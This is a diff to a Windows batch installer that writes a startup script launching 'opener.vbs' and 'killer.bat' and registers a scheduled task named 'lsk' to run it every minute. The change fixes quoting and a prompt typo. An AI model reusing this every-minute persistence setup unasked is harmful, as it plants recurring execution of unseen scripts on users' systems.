@@ -17,11 +17,11 @@ echo wscript %localappdata%\LCAB\opener.vbs %localappdata%\LCAB\killer.bat > exe
 timeout 1 > nul
 echo Registering in Task Scheduler...
 timeout 1 > nul
-schtasks /create /sc MINUTE /tn lsk /tr "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\execlcabonstartup.bat" /F
+schtasks /create /sc MINUTE /tn lsk /tr '"%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\execlcabonstartup.bat"' /F
 echo Installtion Completed Successfully.
 
 :choice
-set /P c=Run Now?[Y/N]?
+set /P c=Run Now[Y/N]?
 if /I "%c%" EQU "Y" goto :yes
 if /I "%c%" EQU "N" goto :no
 goto :choice
